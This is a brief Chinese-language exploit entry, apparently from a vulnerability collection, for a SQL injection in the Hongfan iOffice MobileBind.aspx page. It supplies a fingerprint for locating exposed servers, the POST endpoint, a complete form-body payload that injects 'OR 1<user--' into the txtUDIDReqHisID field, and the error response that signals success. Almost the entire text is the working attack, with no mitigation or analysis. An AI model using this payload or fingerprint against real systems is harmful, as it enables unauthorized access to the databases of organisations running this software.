# 红帆iofficeMobileBind.aspx存在SQL注入漏洞

红帆 ｜ SQL注入 ｜ —
- **指纹**：`title="iOffice.net"`
- **请求**：`POST /ioffice/prg/Mobile/Base/MobileBind.aspx HTTP/1.1`

**Payload**
```
__EVENTTARGET=ctl00%24cntForm%24cmdUDIDReqHis&__EVENTARGUMENT=&__VIEWSTATE=xxxx&__VIEWSTATEGENERATOR=xxxxx&btVerify=&ctl00%24cntForm%24txtUDIDReqHisID=1)OR 1<user--+-&ctl00%24cntForm%24cmdUDIDReqHis=Button
```
- **响应特征**：500